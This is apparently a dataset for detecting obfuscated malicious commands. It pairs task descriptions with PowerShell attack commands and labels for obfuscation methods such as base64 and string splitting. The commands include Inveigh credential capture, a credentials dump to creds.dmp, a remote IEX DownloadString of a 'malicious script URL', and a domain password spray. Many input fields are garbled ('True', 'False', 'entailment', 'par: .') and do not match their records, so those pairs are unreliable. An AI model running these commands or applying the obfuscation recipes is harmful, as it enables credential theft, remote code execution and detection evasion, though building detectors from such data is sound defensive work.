    "input": ":: Open WordPad and print a specified file. Let's: Execute a command to open WordPad.: Open WordPad and print a specified file multiple times.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: I just wrote this: Run a command to open WordPad and print a specified file multiple times.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module and Paraphrase:",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module and Paraphrase:",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module and Paraphrase:",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import the Inveigh module and invoke it.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module and Paraphrase:",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Import and invoke the Inveigh module.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the Inveigh module and invoke it.",
    "origin_cmd": "Import-Module .\\Inveigh.psd1;Invoke-Inveigh"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a legitimate-looking executable with specified parameters.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a legitimate-looking executable with specified parameters.",
    "origin_cmd": ".\\totallylegit.exe ${host.process.id} C:\\Users\\Public\\creds.dmp"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Paraphrase: Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "i would say if you used a word processing program, use cmd.exe.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Paraphrase: Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "i would say if you used a word processing program, use cmd.exe.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Paraphrase: Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "i would say if you used a word processing program, use cmd.exe.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Paraphrase: Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "i would say if you used a word processing program, use cmd.exe.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Execute a command to open the Windows Calculator using cmd.exe.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open the Windows Calculator using cmd.exe.",
    "origin_cmd": "$cmd = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "output": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "entailment",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "par: .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "entailment",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "par: .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "entailment",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "par: .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "entailment",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "par: .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a malicious script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
